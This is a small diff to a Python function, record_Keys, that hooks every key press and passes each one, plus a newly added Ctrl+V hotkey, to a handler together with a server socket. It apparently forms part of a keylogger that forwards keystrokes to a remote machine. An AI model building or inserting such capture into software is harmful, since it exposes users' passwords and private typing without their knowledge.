@@ -83,6 +83,8 @@ def record_Keys(server_soc):
     :rtype: None
     """
     # The lambda receives `e` (event) from keyboard and passes both `e` and `my_custom_value`
+    keyboard.add_hotkey("ctrl+v", on_key, args=("CTRL+V Pressed", server_soc))
+    
     keyboard.on_press(lambda e: on_key(e, server_soc))
 
     print("Listening for key presses... Press ESC to quit.")
